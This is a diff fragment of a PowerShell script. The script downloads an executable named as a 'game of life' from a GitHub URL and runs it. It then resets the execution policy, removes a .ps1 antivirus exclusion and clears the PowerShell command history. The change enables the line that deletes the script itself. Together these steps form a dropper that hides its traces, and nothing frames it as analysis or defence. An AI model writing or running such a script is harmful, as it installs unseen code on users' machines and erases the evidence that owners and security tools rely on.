@@ -10,6 +10,6 @@ Invoke-WebRequest https://github.com/gpib-420/gameoflife/blob/main/life.exe?raw=
 Start-Process life32.exe #Start life
 Set-ExecutionPolicy Restricted -Force #Reset script blocker
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
-#Remove-Item C:\Users\Public\Documents\script.ps1 #Delete script.ps1 file
+Remove-Item C:\Users\Public\Documents\script.ps1 #Delete script.ps1 file
 Clear-Content (Get-PSReadLineOption).HistorySavePath #Clear powershell command history
 exit
